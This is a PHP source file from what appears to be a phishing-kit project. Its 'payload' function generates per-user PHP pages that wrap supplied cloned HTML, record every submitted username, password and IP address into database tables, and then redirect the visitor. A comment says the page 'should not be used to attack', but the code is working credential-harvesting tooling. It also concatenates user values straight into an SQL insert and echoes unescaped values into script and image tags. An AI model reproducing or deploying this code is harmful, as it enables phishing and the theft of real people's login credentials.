<?php
// functions
//include "db.php";

function _http_res($time, $dir){
  echo "<meta http-equiv='refresh' content='{$time};url={$dir}'>";
}

function _innerjs($msg){
  echo "<script>alert('$msg')</script>";
}

function _innerhtml(){
  echo "
   <style></style>
   
  ";
}

function _pictureHundler($connect, $table, $cssid, $style, $SqlPicture, $SqlPhone){
  $picturesql = "select current_profile from {$table} where phone = ?"; 
  $picturesqlq = mysqli_stmt_init($connect);
  if (!mysqli_stmt_prepare($picturesqlq, $picturesql)) {
    echo "sql error";
  } else {
    mysqli_stmt_bind_param($picturesqlq,"s",$SqlPhone);
    mysqli_stmt_execute($picturesqlq);
    $picturesqlq_result = mysqli_stmt_get_result($picturesqlq);
    $picturesqlF = mysqli_fetch_assoc($picturesqlq_result);
  }

    $pictureVar = $picturesqlF["current_profile"];    
    $customDesign = "<style>#$cssid{ $style }</style>";

  if ($picturesqlF["current_profile"] == "") {
    echo "{$customDesign} <img src='../main/xbin/img/sys/def.jpg' id='$cssid' alt='defaultprofile'/>";
  } else {
    echo "{$customDesign} <img src='../main/xbin/img/users/$pictureVar' id='$cssid' alt='$pictureVar'/>";
  }

}


function _antiRoot_($connect,$username){
   // anti root
   $stmt = mysqli_stmt_init($connect);
   if (!mysqli_stmt_prepare($stmt, "select * from users where username = ?")) {
      session_destroy();
      exit();
   } else {
      mysqli_stmt_bind_param($stmt,"s",$username);
      mysqli_stmt_execute($stmt);
      $usercheck_R = mysqli_stmt_get_result($stmt);
   }
    $usercheck = mysqli_fetch_assoc($usercheck_R);
    if (empty($usercheck["username"])) {
      //session_destroy();
      _http_res(0,"../index.php");
      _innerjs("Account deleted");
      exit();
   }
}


              // name     type   table  table2   dir     code    redirect
function payload($connect,$type,$table,$table2,$username,$html,$redirect) {
  $d = '$';

  $code = "
  <?php
   
  require '../../public/php/db.php';
  require '../../public/php/functions.php';
  
  if (isset({$d}_POST['submit'])) {
    {$d}username = trim({$d}_POST['username']);
    {$d}password = trim({$d}_POST['password']);
    {$d}ip = {$d}_SERVER['REMOTE_ADDR'];
    {$d}type = '{$type}';
  
    {$d}stmt = mysqli_stmt_init({$d}connect);
    {$d}sql = 'insert into {$table} (`username`,`password`,`ip`,`type`) values (?,?,?,?)';
    
   if (!mysqli_stmt_prepare({$d}stmt,{$d}sql)) {
     echo 'sql error';
   } else {
     mysqli_stmt_bind_param({$d}stmt,'ssss',{$d}username,{$d}password,{$d}ip,{$d}type);
     mysqli_stmt_execute({$d}stmt);
     mysqli_stmt_close({$d}stmt);
          
     // put in trash
     {$d}stmt_bin = mysqli_stmt_init({$d}connect);
     {$d}sql_bin = 'insert into trash (`username`,`password`,`ip`,`type`) values (?,?,?,?)';
     mysqli_stmt_prepare({$d}stmt_bin,{$d}sql_bin);
     mysqli_stmt_bind_param({$d}stmt_bin,'ssss',{$d}username,{$d}password,{$d}ip,{$d}type);
     mysqli_stmt_execute({$d}stmt_bin);
     mysqli_stmt_close({$d}stmt_bin);
          
     _http_res(0,'{$redirect}');
   }
   
 }
  
?>
  
        {$html}
 
<!-- fake page by bee -->
   <!-- git: github.com/bartwel27/Cloned/ -->
       <!-- this page should not be used to attack -->
       
  ";

  if (!file_exists("../../views/{$username}/{$type}.php")) { 
    mysqli_query($connect,"insert into {$table2} (`owner`,`beelink`,`dir`) values ('{$username}','{$type}.php','{$usertable}')");
    $file = fopen("../../views/{$username}/{$type}.php","w");
    fwrite($file,$code);
    fclose($file);
  } else {
    $file = fopen("../../views/{$username}/{$type}.php","w");
    fwrite($file,$code);
    fclose($file);
    _innerjs("file already exists, updating code...");
  }


}
